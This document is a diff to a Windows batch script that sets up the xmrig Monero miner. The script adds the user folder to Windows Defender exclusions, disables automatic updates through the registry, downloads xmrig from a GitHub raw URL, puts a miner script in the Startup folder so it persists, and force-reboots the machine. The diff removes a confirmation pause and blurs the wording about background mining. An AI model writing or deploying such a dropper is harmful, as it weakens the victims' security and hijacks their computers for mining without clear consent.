@@ -9,6 +9,7 @@ if [%WORKERNAME%] == [] (
   echo Script usage:
   echo ^> setup_mining.bat ^<Worker Name^>
   echo ERROR: Please specify your worker name
+  pause
   exit /b 1
 )
 
@@ -25,7 +26,7 @@ if not exist "%USERPROFILE%" (
 powershell -Command Add-MpPreference -ExclusionPath " %USERPROFILE% "
 echo "Success add folder to exclusions defender %USERPROFILE%"
 
-echo Disable Auto Update & Auto Restart
+echo Disable Auto Update and Auto Restart
 reg add "HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU" /v NoAutoUpdate /t REG_DWORD /d 1 /f
 reg add "HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU" /v NoAutoRebootWithLoggedOnUsers /t REG_DWORD /d 1 /f
 
@@ -81,10 +82,10 @@ echo.
 if %ADMIN% == 0 (
   echo Since I do not have admin access, mining in background will be started using your startup directory script and only work when your are logged in this host.
 ) else (
-  echo Mining in background will be performed using moneroocean_miner service.
+  echo Mining setup will start with admin access.
 )
 
-pause
+timeout 5
 
 echo [*] Downloading xmrig to "%USERPROFILE%\xmrig.zip"
 powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/afnorsGG/rndm/main/xmrig.zip', '%USERPROFILE%\xmrig.zip')"
@@ -140,6 +141,8 @@ xcopy "%USERPROFILE%\setupmining\miner.bat" "%STARTUP_DIR%"
 
 echo [*] Running miner
 call "%STARTUP_DIR%\miner.bat"
+timeout 3
+taskkill /f /xmrig.exe
 
 
 :OK
@@ -147,7 +150,7 @@ echo [*] Setup complete
 echo [*] Do you want to restart now?
 pause
 timeout 5
-shutdown -r -f -y
+shutdown -r -f -y -t 3
 exit /b 0
 
 :strlen string len
